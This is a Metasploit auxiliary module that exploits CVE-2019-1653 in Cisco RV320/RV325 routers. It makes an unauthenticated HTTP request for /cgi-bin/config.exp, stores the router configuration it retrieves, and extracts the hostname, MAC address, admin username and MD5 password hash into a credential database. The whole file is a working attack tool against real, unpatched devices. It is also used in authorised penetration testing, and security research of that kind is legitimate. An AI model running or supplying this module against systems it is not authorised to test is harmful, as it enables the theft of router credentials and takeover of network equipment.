##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco RV320/RV326 Configuration Disclosure',
      'Description'    => %q{
          A vulnerability in the web-based management interface of Cisco Small Business
          RV320 and RV325 Dual Gigabit WAN VPN routers could allow an unauthenticated,
          remote attacker to retrieve sensitive information. The vulnerability is due
          to improper access controls for URLs. An attacker could exploit this
          vulnerability by connecting to an affected device via HTTP or HTTPS and
          requesting specific URLs. A successful exploit could allow the attacker to
          download the router configuration or detailed diagnostic information. Cisco
          has released firmware updates that address this vulnerability.
        },
      'Author'         =>
        [
          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>',
          'Aaron Soto <asoto@rapid7.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '46262'],
          ['BID', '106732'],
          ['CVE', '2019-1653'],
          ['URL', 'https://seclists.org/fulldisclosure/2019/Jan/52'],
          ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
          ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
        ],
      'DisclosureDate' => 'Jan 24 2019',
      'DefaultOptions' =>
        {
          'SSL'   => true
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),
      ])
  end

  def report_cred(user, hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: 'md5',
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_config(config)
    # Report loot to database (and store on filesystem)
    stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, config)
    print_good("Stored configuration (#{config.length} bytes) to #{stored_path}")

    # Report host information to database
    hostname = config.match(/^HOSTNAME=(.*)/)[1]
    model = config.match(/^MODEL=(.*)/)[1]
    mac = config.match(/^LANMAC=(.*)/)[1]
    mac = mac.scan(/\w{2}/).join(':')
    report_host(host: rhost,
                mac: mac,
                name: hostname,
                os_name: 'Cisco',
                os_flavor: model)

    # Report password hashes to database
    user = config.match(/^user (.*)/)[1]
    hash = config.match(/^password (.*)/)[1]
    report_cred(user, hash)
  end

  def run
    begin
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
      }, 60)
    rescue OpenSSL::SSL::SSLError
      fail_with(Failure::UnexpectedReply, 'SSL handshake failed.  Consider setting SSL to false and trying again.')
    end

    if res.nil?
      fail_with(Failure::UnexpectedReply, 'Empty response.  Please validate the RHOST and TARGETURI options and try again.')
    elsif res.code != 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options and try again.")
    end

    body = res.body
    if body.match(/####sysconfig####/)
      parse_config(body)
    else body.include?"meta http-equiv=refresh content='0; url=/default.htm'"
      fail_with(Failure::NotVulnerable, 'Response suggests device is patched')
    end
  end
end
